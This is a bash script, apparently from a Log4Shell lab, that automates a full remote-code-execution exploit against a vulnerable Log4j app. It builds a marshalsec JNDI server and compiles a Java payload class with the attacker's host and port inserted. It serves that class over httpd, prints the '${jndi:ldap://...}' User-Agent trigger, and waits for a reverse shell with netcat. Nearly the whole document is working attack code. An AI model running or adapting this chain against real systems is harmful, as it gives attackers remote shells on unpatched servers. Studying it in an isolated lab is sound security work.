#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "usage : $0 <host_ip>"
    echo "The host_ip from the docker perspective could be found with : sudo docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' log4shell-vulnerable-app_vulnapp_1"
    echo "change the last digit to .1 on the previous command"
    exit 1
fi

LHOST=$1
# jndi server
LPORT_SERVER=4445
#Â class server
LPORT_CLASS=4443
# listener
LPORT=4444

NC='\033[0m'
RED='\033[0;31m'
BLUE='\033[0;34m'

# JNDI server build
if [[ -d marshalsec ]]
  then
     echo -e "${BLUE}[+] marshalsec exist skiping${NC}"
  else
      echo -e "${BLUE}[+] clone marshalsec${NC}"
      git clone https://github.com/mbechler/marshalsec
fi

echo -e "${BLUE}[+] build marshalsec${NC}"
sudo docker build . -t log4shell_server

# RCE CLASS build
echo -e "${BLUE}[+] build class${NC}"
cd exploit
cp RceTest.sample RceTest.java
sed -i "s/LHOST/${LHOST}/g" RceTest.java
sed -i "s/LPORT/${LPORT}/g" RceTest.java
sudo docker run --rm -v "$(pwd)/:/app" -w /app -ti openjdk:8u181-jdk-alpine javac RceTest.java
cd ..

# JNDI server start to answer jndi call
echo -e "${BLUE}[+] start jndi server on ${LPORT_SERVER} ${NC}"
sudo docker rm -f jndiserver
sudo docker run -d --name="jndiserver" --rm -p 0.0.0.0:${LPORT_SERVER}:1389 log4shell_server "http://${LHOST}:${LPORT_CLASS}/#RceTest"

# http server start to deserve the class
echo -e "${BLUE}[+] start httpd class server on ${LPORT_CLASS}${NC}"
sudo docker rm -f classserver
sudo docker run -d --name="classserver" -p 0.0.0.0:${LPORT_CLASS}:80 -v "$(pwd)/exploit:/usr/local/apache2/htdocs/" httpd

# Listen
echo -e "${BLUE}[+] to trig the vuln play : ${NC}${RED}curl 127.0.0.1:8081 -H 'User-Agent: \${jndi:ldap://${LHOST}:4445/x}' ${NC}"
echo -e "${BLUE}[+] listen for reverse shell on ${LPORT}${NC}"
nc -nvlp ${LPORT}

# stop docker instances
echo -e "${BLUE}[+] stop jndi server${NC}"
sudo docker stop jndiserver
echo -e "${BLUE}[+] stop httpd class server${NC}"
sudo docker stop classserver
